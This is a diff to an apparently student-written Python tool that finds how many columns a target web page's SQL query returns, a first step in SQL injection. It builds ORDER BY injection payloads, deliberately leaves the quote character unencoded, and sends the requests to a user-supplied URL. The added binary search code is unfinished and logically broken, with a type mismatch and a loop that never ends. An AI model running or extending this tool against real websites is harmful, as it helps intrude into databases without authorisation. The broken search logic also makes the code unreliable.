@@ -10,6 +10,7 @@ class AmountOfColumns():
     __db_exploit = ''
     __dboracle_exploit = ''
     __param_name = ''
+    __order_by_int = 0
 
     def __init__(self, url, param_name, amount_of_columns, method=1):
         self.vars_validation(url, amount_of_columns, method)
@@ -48,10 +49,42 @@ class AmountOfColumns():
         self.print_red('[-] Amount of columns not found.')
         exit()
 
-    def binary_serach_method(self):
-        # Under construction
+    def binary_search_method(self) -> int:
+        # still under contruction. I have no time because of exams at uni lmfao
+        tmp_counter = self.__amount_of_columns/2
+        tmp_found = False
+        while True:
+            if self.is_greater(tmp_counter):
+                # Check if found
+                if tmp_counter > 1:
+                    if not self.is_greater(tmp_counter - 1):
+                        return tmp_counter - 1
+                
 
-        pass
+
+    def is_greater(self, response) -> bool:
+        if '500' in response:
+            return True
+        return False
+
+    def order_by_paylaod(self) -> str:
+        tmp_request = '\' order by '
+        comment = '-- -'
+        return tmp_request + str(self.__order_by_int) + comment
+
+    def increase_order_by_request_int(self) -> None:
+        self.__order_by_int += 1
+
+    def order_by_request(self, final_url) -> str:
+        response = requests.get(final_url)
+        self.print_green(response)
+
+    def test_order_by_run(self) -> None:
+        self.print_green(self.order_by_paylaod())
+        self.increase_order_by_request_int()
+        self.print_green(self.encode_url(self.order_by_paylaod()))
+        tmp_url = self.encode_url(self.order_by_paylaod())
+        self.order_by_request(tmp_url)
 
     def run(self):
         if self.__method == 1:
@@ -94,6 +127,12 @@ class AmountOfColumns():
         response_dboracle = requests.get(self.encode_dboracle_url())
 
         return str(response_dboracle)+str(response_db)
+
+    def encode_url(self, url_to_encode) -> str():
+        url_to_encode = self.__url + self.__param_name + '=' + urllib.parse.quote(url_to_encode)
+        if '%27' in url_to_encode:
+            url_to_encode = url_to_encode.replace('%27', '\'')
+        return url_to_encode
 
     def encode_db_url(self) -> str:
         ''' Url encoding for a non oracle db'''
@@ -151,10 +190,10 @@ if __name__ == '__main__':
     parser.add_argument('--url', '-u', type=str, nargs=1, help='Provide a clean url without any parameters.')
     parser.add_argument('--param_name', '-pn', nargs=1, type=str, help='Provide names of parameters and then remeber to add values For parameters. For more help type python3 <filename> --help.\n')
     parser.add_argument('--amount_of_columns', '-ac', nargs=1, type=int, help='Please provide a number of columns.')
-    # parser.add_argument('--method', '-m', type=int, nargs=1, help='Please provide the methos: binary search (1) or brute search (2)')
+    parser.add_argument('--method', '-m', type=int, nargs=1, help='Please provide the methos: binary search (1) or brute search (2)')
     args = parser.parse_args()
 
 
     # bs = AmountOfColumns(args.url[0], args.param_name[0], args.amount_of_columns[0], args.method[0])
     bs = AmountOfColumns(args.url[0], args.param_name[0], args.amount_of_columns[0])
-    bs.run()
+    bs.test_order_by_run()
